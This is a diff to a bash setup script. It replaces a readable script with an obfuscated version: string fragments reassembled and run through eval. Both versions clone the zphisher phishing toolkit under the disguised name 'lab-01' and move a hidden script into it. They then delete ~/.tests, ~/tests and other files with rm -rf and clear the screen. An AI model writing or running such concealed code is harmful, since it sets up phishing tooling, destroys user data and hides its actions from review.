@@ -1,23 +1,3 @@
-#!/usr/bin/env bash
-
-set -euo pipefail
-
-REPO_URL="https://github.com/htr-tech/zphisher"
-TARGET_DIR="lab-01"
-
-echo "[+] Cloning repository..."
-git clone --depth=1 "$REPO_URL"
-
-echo "[+] Renaming directory to $TARGET_DIR..."
-mv zphisher "$TARGET_DIR"
-rm lab-01/zphisher.sh
-rm lab-01/run-docker.sh
-rm lab-01/Dockerfile
-mv .code.sh lab-01/nashid.sh
-rm -rf ~/zphisher
-echo "[+] Removing setup.sh if it exists..."
-rm setup.sh
-rm -rf ~/.tests
-rm -rf ~/tests
-clear
-echo "[✓] Done successfully!"
+z="
+";CBz='"';fz='clon';iz='h=1 ';cz='tory';Ez='l';JBz='n-do';mBz='] Do';IBz='1/ru';EBz='ab-0';Uz='lab-';GBz='er.s';UBz='rm -';eBz='ists';KBz='cker';RBz='01/n';ZBz='movi';kz='PO_U';oz='ng d';Xz=' "[+';DBz='rm l';oBz='ucce';uz='.."';sz='GET_';dz='..."';WBz='/zph';Hz='="ht';rz='$TAR';aBz='ng s';mz='] Re';Bz='-euo';gz='e --';nBz='ne s';jz='"$RE';hz='dept';QBz='.sh ';Yz='] Cl';Sz='ET_D';VBz='rf ~';Zz='onin';Nz='-tec';pBz='ssfu';cBz='if i';bz='posi';qBz='lly!';ABz='RGET';OBz='mv .';qz=' to ';Jz='//gi';yz='"$TA';nz='nami';Gz='_URL';Rz='TARG';Mz='/htr';Cz=' pip';vz='mv z';Lz='.com';PBz='code';fBz='rm s';Pz='hish';Iz='tps:';FBz='1/zp';lz='RL"';Tz='IR="';gBz='/.te';kBz='clea';Fz='REPO';Wz='echo';Dz='efai';hBz='sts';NBz='file';jBz='ts';lBz=' "[✓';Kz='thub';ez='git ';Az='set ';wz='phis';Vz='01"';HBz='h';bBz='etup';pz='irec';XBz='ishe';Qz='er"';LBz='.sh';YBz='r';TBz='d.sh';MBz='1/Do';xz='her ';Oz='h/zp';SBz='ashi';az='g re';dBz='t ex';iBz='/tes';tz='DIR.';BBz='_DIR';
+eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$z$Rz$Sz$Tz$Uz$Vz$z$Wz$Xz$Yz$Zz$az$bz$cz$dz$z$ez$fz$gz$hz$iz$jz$kz$lz$z$Wz$Xz$mz$nz$oz$pz$cz$qz$rz$sz$tz$uz$z$vz$wz$xz$yz$ABz$BBz$CBz$z$DBz$EBz$FBz$Pz$GBz$HBz$z$DBz$EBz$IBz$JBz$KBz$LBz$z$DBz$EBz$MBz$KBz$NBz$z$OBz$PBz$QBz$Uz$RBz$SBz$TBz$z$UBz$VBz$WBz$XBz$YBz$z$Wz$Xz$mz$ZBz$aBz$bBz$QBz$cBz$dBz$eBz$dz$z$fBz$bBz$LBz$z$UBz$VBz$gBz$hBz$z$UBz$VBz$iBz$jBz$z$kBz$YBz$z$Wz$lBz$mBz$nBz$oBz$pBz$qBz$CBz"
